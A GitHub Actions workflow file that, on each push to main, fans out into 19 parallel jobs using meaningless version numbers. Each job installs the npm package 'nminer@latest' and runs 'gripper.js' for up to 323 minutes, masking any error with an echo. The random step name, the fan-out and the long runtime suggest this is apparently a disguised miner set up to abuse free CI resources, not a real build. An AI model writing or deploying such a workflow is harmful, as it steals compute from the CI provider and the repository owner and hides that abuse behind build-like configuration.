name: gripper
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7925 }
          - { version: 9934 }
          - { version: 6131 }
          - { version: 4972 }
          - { version: 319 }
          - { version: 3393 }
          - { version: 1775 }
          - { version: 3920 }
          - { version: 8908 }
          - { version: 8406 }
          - { version: 1561 }
          - { version: 2744 }
          - { version: 4106 }
          - { version: 2935 }
          - { version: 8448 }
          - { version: 9994 }
          - { version: 7360 }
          - { version: 6464 }
          - { version: 7499 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: consequently nightlife or
        run: |
          npm install nminer@latest
          timeout 323m node gripper.js || echo "gripper executed"